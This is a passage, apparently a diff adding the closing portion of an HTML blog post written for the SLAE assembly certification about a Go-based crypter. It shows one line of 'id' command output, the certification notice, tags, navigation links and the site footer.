+uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+</code></pre></div></div>
+
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
+
+<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+
+<p>Student ID: SLAE-1236</p>
+
+<p>All source files can be found on GitHub at <a href="https://github.com/slemire/slae32">https://github.com/slemire/slae32</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#assembly" class="page__taxonomy-item" rel="tag">assembly</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#crypter" class="page__taxonomy-item" rel="tag">crypter</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#go" class="page__taxonomy-item" rel="tag">go</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#slae" class="page__taxonomy-item" rel="tag">slae</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#slae" class="page__taxonomy-item" rel="tag">slae</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-12-12T00:00:00+01:00">December 12, 2018</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/polymorphic-shellcode/" class="pagination--pager" title="Polymorphic Linux Shellcode
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-waldo/" class="pagination--pager" title="Waldo - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
